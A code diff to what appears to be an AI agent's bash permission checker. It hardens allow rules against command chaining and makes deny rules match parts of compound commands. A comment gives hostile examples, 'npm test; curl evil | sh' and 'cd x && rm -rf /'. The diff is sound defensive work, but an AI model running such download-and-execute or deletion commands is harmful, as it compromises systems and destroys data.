@@ -14,6 +14,21 @@
  * 1. Match the most specific pattern first.
  * 2. If no rule matches, return "ask" (fallback to interactive behavior).
  * 3. In headless mode, "ask" becomes "deny" unless --dangerously-allow-all is set.
+ *
+ * A pattern matches a target that starts with it, or that matches it as a
+ * glob. For bash commands an "allow" rule is stricter, because a command
+ * that starts with an allowed one can run anything after it
+ * (`npm test; curl evil | sh`):
+ * - a prefix match must end at a word boundary (`npm test` allows
+ *   `npm test -- --watch`, not `npm testify`), and the rest of the command
+ *   may contain no shell control syntax (; & | ` $( ${ < > newline or
+ *   other control characters);
+ * - a glob match applies only when every control token in the command
+ *   also appears in the pattern;
+ * - a pattern of only wildcards (`**`, `*`) still allows every command.
+ * An allow rule that does not apply falls through to the next rule.
+ * "deny" and "ask" rules match bash commands as before, and also match
+ * each command in a compound command (`cd x && rm -rf /` matches `rm -rf`).
  */
 
 import { resolve, relative } from "node:path";
@@ -45,7 +60,13 @@ export function evaluatePermissionRules(
   const entries = Object.entries(toolRules).sort((a, b) => b[0].length - a[0].length);
 
   for (const [pattern, rule] of entries) {
-    if (matchPattern(target, pattern, req.cwd)) {
+    const matched =
+      req.tool !== "bash"
+        ? matchPattern(target, pattern, req.cwd)
+        : rule === "allow"
+          ? matchBashAllow(target, pattern, req.cwd)
+          : matchBashRestrict(target, pattern, req.cwd);
+    if (matched) {
       return rule;
     }
   }
@@ -97,6 +118,12 @@ function matchPattern(target: string, pattern: string, cwd: string): boolean {
     return true;
   }
 
+  return matchGlob(target, pattern, cwd);
+}
+
+function matchGlob(target: string, pattern: string, cwd: string): boolean {
+  const expandedPattern = pattern.startsWith("~/") ? resolve(homedir(), pattern.slice(2)) : pattern;
+
   // Glob-style matching using simple rules
   const regex = globToRegex(expandedPattern);
   if (regex.test(target)) {
@@ -114,6 +141,59 @@ function matchPattern(target: string, pattern: string, cwd: string): boolean {
   }
 
   return false;
+}
+
+/** Shell syntax that can run another command, redirect, or substitute. */
+const CONTROL_TOKENS = [";", "&", "|", "`", "$(", "${", "<", ">", "\n", "\r"];
+// Control characters other than tab (newline and CR are listed above).
+// eslint-disable-next-line no-control-regex
+const OTHER_CONTROL_CHARS = /[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]/;
+
+function hasControlSyntax(text: string): boolean {
+  return OTHER_CONTROL_CHARS.test(text) || CONTROL_TOKENS.some((t) => text.includes(t));
+}
+
+/** Control syntax in `command` that `pattern` does not itself contain. */
+function hasControlSyntaxBeyond(command: string, pattern: string): boolean {
+  if (OTHER_CONTROL_CHARS.test(command) && !OTHER_CONTROL_CHARS.test(pattern)) return true;
+  return CONTROL_TOKENS.some((t) => command.includes(t) && !pattern.includes(t));
+}
+
+function isWildcardOnly(pattern: string): boolean {
+  return /^[*\s]+$/.test(pattern);
+}
+
+/**
+ * An "allow" rule for a bash command. Matches the same commands as
+ * matchPattern except that a prefix match must end at a word boundary and
+ * leave no shell control syntax in the rest of the command, and a glob
+ * match must not let in control syntax the pattern does not contain.
+ */
+function matchBashAllow(command: string, pattern: string, cwd: string): boolean {
+  if (isWildcardOnly(pattern)) return true;
+  const prefix = pattern.startsWith("~/") ? resolve(homedir(), pattern.slice(2)) : pattern;
+  if (command.startsWith(prefix)) {
+    const rest = command.slice(prefix.length);
+    const boundary = rest === "" || /\s/.test(rest[0]!) || !/\w$/.test(prefix);
+    // `$` at the end of the pattern plus `(` / `{` after it is `$(` / `${`.
+    const splitsToken = prefix.endsWith("$") && /^[({]/.test(rest);
+    if (boundary && !splitsToken && !hasControlSyntax(rest)) return true;
+  }
+  if (hasControlSyntaxBeyond(command, pattern)) return false;
+  return matchGlob(command, pattern, cwd);
+}
+
+/**
+ * A "deny" or "ask" rule for a bash command: everything matchPattern
+ * matches, plus any single command inside a compound one.
+ */
+function matchBashRestrict(command: string, pattern: string, cwd: string): boolean {
+  if (matchPattern(command, pattern, cwd)) return true;
+  const segments = command
+    .split(/;|&|\||`|\$\(|\(|\)|\{|\}|\n|\r/)
+    .map((seg) => seg.trim())
+    .filter((seg) => seg && seg !== command);
+  return segments.some((seg) => matchPattern(seg, pattern, cwd));
 }
 
 function globToRegex(pattern: string): RegExp {
